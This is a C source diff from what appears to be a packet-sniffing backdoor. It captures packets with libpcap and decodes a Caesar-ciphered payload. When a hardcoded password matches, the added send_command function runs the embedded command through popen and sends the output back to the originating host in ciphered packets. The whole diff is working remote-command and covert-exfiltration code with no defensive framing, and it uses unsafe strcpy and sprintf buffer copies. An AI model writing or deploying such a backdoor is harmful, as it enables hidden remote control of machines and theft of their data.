@@ -114,7 +114,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 	printf("Size of payload: %d\n", size_payload);
 	/* Decrypt the payload */
-	strcpy(decrypted, DecryptCaesar(mDecipher, (char *) payload, MOD, START));
+	strcpy(decrypted, ConvertCaesar(mDecipher, (char *) payload, MOD, START));
 
 	memset(password, 0, sizeof(password));
 	if(sscanf(decrypted, "%s %d", password, &mode) < 2)
@@ -127,7 +127,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
 	{
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
-		send_command(command);
+		send_command(command, ip, ntohs(tcp->th_sport));
 		free(command);
 		return;
 	}
@@ -164,8 +164,29 @@ char * parse_cmd(char * data)
 	return command;
 }
 
-void send_command(char * command)
+int send_command(char * command, const struct ip_struct * ip, const int dest_port)
 {
-	/* use popen here */
-	/* use send_packet */
+	FILE *fp;
+
+	char cmd_results[PKT_SIZE];
+	char packet[PKT_SIZE];
+	char encrypted[PKT_SIZE];
+
+	if((fp = popen(command, "r")) == NULL)
+	{
+		fprintf(stderr, "Cannot process command.\n");
+		return -1;
+	}
+	while(fgets(cmd_results, PKT_SIZE - 1, fp) != NULL)
+	{
+		//Format packet payload
+		sprintf(packet, "%s %d %s%s%s", PASSWORD, CLIENT_MODE, CMD_START, cmd_results, CMD_END);
+		
+		//Encrypt payload
+		strcpy(encrypted, ConvertCaesar(mEncipher, packet, MOD, START));
+		
+		//Send it over to the client
+		send_packet(encrypted, inet_ntoa(ip->ip_src), inet_ntoa(ip->ip_dst), dest_port);
+	}
+	return 0;
 }
